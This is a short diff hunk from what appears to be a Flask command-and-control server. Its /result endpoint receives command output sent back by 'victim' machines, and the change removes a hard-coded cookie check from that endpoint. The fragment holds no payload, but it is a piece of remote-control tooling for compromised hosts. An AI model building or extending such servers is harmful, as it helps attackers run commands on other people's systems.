@@ -133,8 +133,6 @@ def shell():
 # this is where the victim will send the command result
 @app.route('/result', methods = ['POST'])
 def result():
-  if request.cookies.get('superSecretKey') != 'c457r4v371':
-    return render_template('notLoggedIn.html')
   global hosts
   
   key = (request.remote_addr, request.form['name'])
